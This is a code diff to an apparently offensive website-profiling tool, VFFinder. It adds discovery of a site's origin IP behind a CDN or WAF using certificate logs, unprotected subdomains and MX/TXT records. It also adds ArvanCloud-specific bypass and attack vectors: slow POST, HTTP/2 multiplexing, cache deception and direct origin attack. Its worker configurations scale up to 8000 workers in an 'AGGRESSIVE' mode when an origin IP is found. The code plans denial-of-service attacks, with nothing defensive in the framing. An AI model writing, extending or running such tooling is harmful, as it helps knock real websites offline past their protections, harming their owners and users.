@@ -435,6 +435,10 @@ class SiteProfile:
         self.hosting_provider: Optional[str] = None
         self.subdomains: List[str] = []
 
+        # Origin IP (behind CDN)
+        self.origin_ips: List[str] = []
+        self.origin_ip_source: Optional[str] = None
+
         # Deep scan
         self.found_paths: List[Dict[str, Any]] = []
         self.sensitive_files: List[str] = []
@@ -490,6 +494,8 @@ class SiteProfile:
             "ip_addresses": self.ip_addresses,
             "hosting_provider": self.hosting_provider,
             "subdomains": self.subdomains,
+            "origin_ips": self.origin_ips,
+            "origin_ip_source": self.origin_ip_source,
             "found_paths": self.found_paths,
             "sensitive_files": self.sensitive_files,
             "attack_profile": self.attack_profile,
@@ -537,51 +543,58 @@ class VFFinder:
         print(f"{'='*72}\n")
 
         # Phase 1: HTTP Fingerprinting
-        print(f"  {C.CY}[1/9] HTTP Fingerprinting...{C.RS}")
+        print(f"  {C.CY}[1/10] HTTP Fingerprinting...{C.RS}")
         await self._http_fingerprint()
 
         # Phase 2: Technology Detection
-        print(f"  {C.CY}[2/9] Technology Detection...{C.RS}")
+        print(f"  {C.CY}[2/10] Technology Detection...{C.RS}")
         self._detect_technologies()
 
         # Phase 3: Content Analysis
-        print(f"  {C.CY}[3/9] Content Analysis...{C.RS}")
+        print(f"  {C.CY}[3/10] Content Analysis...{C.RS}")
         self._analyze_content()
 
         # Phase 3.5: JS Bundle Analysis (for SPA apps)
         if self.profile.scripts:
-            print(f"  {C.CY}[4/9] JS Bundle Analysis (API Discovery)...{C.RS}")
+            print(f"  {C.CY}[4/10] JS Bundle Analysis (API Discovery)...{C.RS}")
             await self._analyze_js_bundles()
         else:
-            print(f"  {C.DM}[4/9] JS Bundle Analysis: No scripts found{C.RS}")
+            print(f"  {C.DM}[4/10] JS Bundle Analysis: No scripts found{C.RS}")
 
         # Phase 4: Security Headers Audit
-        print(f"  {C.CY}[5/9] Security Headers Audit...{C.RS}")
+        print(f"  {C.CY}[5/10] Security Headers Audit...{C.RS}")
         self._audit_security_headers()
 
         # Phase 5: SSL/TLS Analysis
         if self.profile.scheme == 'https':
-            print(f"  {C.CY}[6/9] SSL/TLS Analysis...{C.RS}")
+            print(f"  {C.CY}[6/10] SSL/TLS Analysis...{C.RS}")
             await asyncio.get_event_loop().run_in_executor(None, self._analyze_ssl)
         else:
-            print(f"  {C.Y}[6/9] SSL: Not HTTPS, skipping{C.RS}")
+            print(f"  {C.Y}[6/10] SSL: Not HTTPS, skipping{C.RS}")
 
         # Phase 6: DNS Enumeration
         if self.dns_scan:
-            print(f"  {C.CY}[7/9] DNS Enumeration...{C.RS}")
+            print(f"  {C.CY}[7/10] DNS Enumeration...{C.RS}")
             await self._dns_enumerate()
         else:
-            print(f"  {C.DM}[7/9] DNS: Skipped (use --dns to enable){C.RS}")
+            print(f"  {C.DM}[7/10] DNS: Skipped (use --dns to enable){C.RS}")
 
-        # Phase 7: Deep Scan
+        # Phase 7: Origin IP Discovery (if WAF/CDN detected)
+        if self.profile.waf or self.profile.cdn:
+            print(f"  {C.CY}[8/10] Origin IP Discovery (CDN bypass)...{C.RS}")
+            await self._discover_origin_ip(self.profile.domain)
+        else:
+            print(f"  {C.DM}[8/10] Origin IP Discovery: Skipped (no CDN/WAF){C.RS}")
+
+        # Phase 8: Deep Scan
         if self.deep:
-            print(f"  {C.CY}[8/9] Deep Path Scanning...{C.RS}")
+            print(f"  {C.CY}[9/10] Deep Path Scanning...{C.RS}")
             await self._deep_scan()
         else:
-            print(f"  {C.DM}[8/9] Deep Scan: Skipped (use --deep to enable){C.RS}")
+            print(f"  {C.DM}[9/10] Deep Scan: Skipped (use --deep to enable){C.RS}")
 
-        # Phase 8: Performance Baseline
-        print(f"  {C.CY}[9/9] Performance Baseline...{C.RS}")
+        # Phase 9: Performance Baseline
+        print(f"  {C.CY}[10/10] Performance Baseline...{C.RS}")
         await self._performance_baseline()
 
         # Generate Attack Profile
@@ -1067,6 +1080,136 @@ class VFFinder:
         self.profile.subdomains = found
         print(f"  {C.G}  Subdomains found: {len(found)}{C.RS}")
 
+    async def _discover_origin_ip(self, domain: str):
+        """Discover the real origin IP behind CDN (ArvanCloud, Cloudflare, etc.)"""
+        import urllib.request
+        import ssl
+
+        found_ips = []
+        sources = {}
+
+        print(f"  {C.CY}  Attempting Origin IP Discovery...{C.RS}")
+
+        # Method 1: crt.sh Certificate Transparency logs
+        try:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            url = f"https://crt.sh/?q=%.{domain}&output=json"
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
+                data = json.loads(resp.read().decode('utf-8', errors='replace'))
+                crt_ips = set()
+                for entry in data[:50]:
+                    name = entry.get('name_value', '')
+                    for line in name.split('\n'):
+                        line = line.strip().lower()
+                        if line and line != domain and not line.startswith('*'):
+                            # Resolve subdomain to IP
+                            try:
+                                ip = socket.gethostbyname(line)
+                                # Check if this IP is NOT a known CDN IP
+                                if not self._is_cdn_ip(ip):
+                                    crt_ips.add(ip)
+                                    sources[ip] = f"crt.sh ({line})"
+                            except Exception:
+                                pass
+                found_ips.extend(crt_ips)
+                if crt_ips:
+                    print(f"  {C.G}    crt.sh: Found {len(crt_ips)} non-CDN IPs{C.RS}")
+        except Exception as e:
+            print(f"  {C.Y}    crt.sh: {type(e).__name__}{C.RS}")
+
+        # Method 2: DNS history via SecurityTrails-style resolution
+        try:
+            # Try common subdomains that might not be behind CDN
+            direct_subs = ['mail', 'ftp', 'direct', 'origin', 'server',
+                          'old', 'dev', 'staging', 'beta', 'test',
+                          'ns1', 'ns2', 'dns1', 'dns2', 'mxbk']
+            for sub in direct_subs:
+                try:
+                    fqdn = f"{sub}.{domain}"
+                    ip = socket.gethostbyname(fqdn)
+                    if not self._is_cdn_ip(ip) and ip not in found_ips:
+                        found_ips.append(ip)
+                        sources[ip] = f"subdomain ({fqdn})"
+                        print(f"  {C.G}    {fqdn} -> {ip} (non-CDN){C.RS}")
+                except socket.gaierror:
+                    pass
+        except Exception:
+            pass
+
+        # Method 3: Check SPF/MX records for origin hints
+        if HAS_DNS:
+            try:
+                mx_answers = dns.resolver.resolve(domain, 'MX')
+                for mx in mx_answers:
+                    mx_host = str(mx.exchange).rstrip('.')
+                    try:
+                        mx_ip = socket.gethostbyname(mx_host)
+                        if not self._is_cdn_ip(mx_ip) and mx_ip not in found_ips:
+                            found_ips.append(mx_ip)
+                            sources[mx_ip] = f"MX record ({mx_host})"
+                            print(f"  {C.G}    MX: {mx_host} -> {mx_ip} (non-CDN){C.RS}")
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # TXT records sometimes leak origin
+            try:
+                txt_answers = dns.resolver.resolve(domain, 'TXT')
+                for txt in txt_answers:
+                    txt_val = str(txt)
+                    # Look for IP patterns in TXT
+                    import re as _re
+                    ip_matches = _re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', txt_val)
+                    for ip in ip_matches:
+                        if not self._is_cdn_ip(ip) and ip not in found_ips:
+                            found_ips.append(ip)
+                            sources[ip] = f"TXT record"
+                            print(f"  {C.G}    TXT: Found IP {ip}{C.RS}")
+            except Exception:
+                pass
+
+        # Store results
+        self.profile.origin_ips = found_ips
+        if found_ips:
+            self.profile.origin_ip_source = sources.get(found_ips[0], "unknown")
+            print(f"  {C.G}  Origin IPs found: {len(found_ips)}{C.RS}")
+            for ip in found_ips[:5]:
+                src = sources.get(ip, "unknown")
+                print(f"  {C.G}    {ip} (via {src}){C.RS}")
+        else:
+            print(f"  {C.Y}  No origin IPs discovered{C.RS}")
+
+    def _is_cdn_ip(self, ip: str) -> bool:
+        """Check if an IP belongs to a known CDN provider"""
+        # Known CDN IP ranges (ArvanCloud, Cloudflare, etc.)
+        cdn_ranges = [
+            # ArvanCloud ranges (Iran-based CDN)
+            "185.143.234.", "185.143.235.", "185.143.236.", "185.143.237.",
+            "185.143.238.", "185.143.239.", "185.143.240.", "185.143.241.",
+            "92.114.16.", "92.114.17.", "92.114.18.", "92.114.19.",
+            "5.160.128.", "5.160.129.", "5.160.130.", "5.160.131.",
+            "94.101.184.", "94.101.185.", "94.101.186.", "94.101.187.",
+            "185.49.84.", "185.49.85.", "185.49.86.", "185.49.87.",
+            "31.56.136.", "31.56.137.", "31.56.138.", "31.56.139.",
+            # Cloudflare ranges
+            "103.21.244.", "103.22.200.", "103.31.4.", "104.16.", "104.17.",
+            "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+            "104.24.", "104.25.", "104.26.", "104.27.",
+            "108.162.192.", "131.0.72.", "141.101.64.", "162.158.0.",
+            "172.64.0.", "173.245.48.", "188.114.96.", "190.93.240.",
+            "197.234.240.", "198.41.128.",
+            # Other CDNs
+            "151.139.", "199.232.", "167.99.", "138.197.",
+        ]
+        for cdn_range in cdn_ranges:
+            if ip.startswith(cdn_range):
+                return True
+        return False
+
     # ─── Phase 7: Deep Scan ──────────────────────────────────────────────────
 
     async def _deep_scan(self):
@@ -1197,6 +1340,8 @@ class VFFinder:
             "recommended_strategy": self._determine_strategy(),
             "attack_vectors": self._determine_vectors(),
             "waf_strategy": self._determine_waf_strategy(),
+            "origin_ips": p.origin_ips,
+            "origin_ip_source": p.origin_ip_source,
             "worker_config": self._determine_worker_config(),
             "request_config": self._determine_request_config(),
             "login_config": self._determine_login_config(),
@@ -1298,6 +1443,14 @@ class VFFinder:
            p.headers.get("Keep-Alive", ""):
             vectors.append("SLOWLORIS")
 
+        # ArvanCloud/CDN specific vectors
+        if p.waf and "arvan" in p.waf.lower():
+            vectors.append("SLOW_POST_READ")
+            vectors.append("CACHE_DECEPTION")
+            vectors.append("HTTP2_MULTIPLEX")
+            if p.origin_ips:
+                vectors.append("ORIGIN_DIRECT")
+
         # API flood if endpoints detected
         if p.api_endpoints:
             vectors.append("API_FLOOD")
@@ -1338,12 +1491,25 @@ class VFFinder:
             ]
         elif "arvan" in waf_lower:
             strategy["bypass_methods"] = [
+                "ORIGIN_IP_DIRECT",
+                "SLOW_POST_READ",
+                "HTTP2_MULTIPLEX",
+                "CACHE_DECEPTION",
                 "ROTATE_USER_AGENT",
                 "SLOW_RAMP_UP",
                 "CACHE_BUST_PARAMS",
                 "HEADER_MANIPULATION",
                 "DISTRIBUTED_SOURCES",
             ]
+            strategy["arvan_specific"] = {
+                "slow_post_chunk_interval_ms": 100,
+                "slow_post_body_size": 100000,
+                "http2_max_streams": 100,
+                "cache_bust_headers": [
+                    "Pragma: no-cache",
+                    "Cache-Control: no-cache, no-store, must-revalidate",
+                ],
+            }
         elif "modsecurity" in waf_lower:
             strategy["bypass_methods"] = [
                 "PAYLOAD_ENCODING",
@@ -1397,6 +1563,17 @@ class VFFinder:
                 config["step"] = 15
                 config["step_duration"] = 10
                 config["ramp_strategy"] = "SLOW_STEALTHY"
+            elif "arvan" in (p.waf or "").lower():
+                config["initial_workers"] = 10
+                config["step"] = 30
+                config["step_duration"] = 6
+                config["ramp_strategy"] = "GRADUAL"
+                # If we found origin IPs, we can be more aggressive
+                if p.origin_ips:
+                    config["initial_workers"] = 20
+                    config["step"] = 50
+                    config["max_workers"] = 8000
+                    config["ramp_strategy"] = "AGGRESSIVE"
 
         # Adjust based on baseline RT
         if p.baseline_rt > 2.0:
@@ -1570,6 +1747,10 @@ class VFFinder:
                 config["proxy_rotation"] = True
             if "arvan" in waf_lower:
                 config["header_randomization"] = True
+                config["cache_deception"] = True
+                config["slow_post_read"] = True
+                config["http2_multiplex"] = True
+                config["origin_ip_attack"] = bool(p.origin_ips)
 
         return config
 
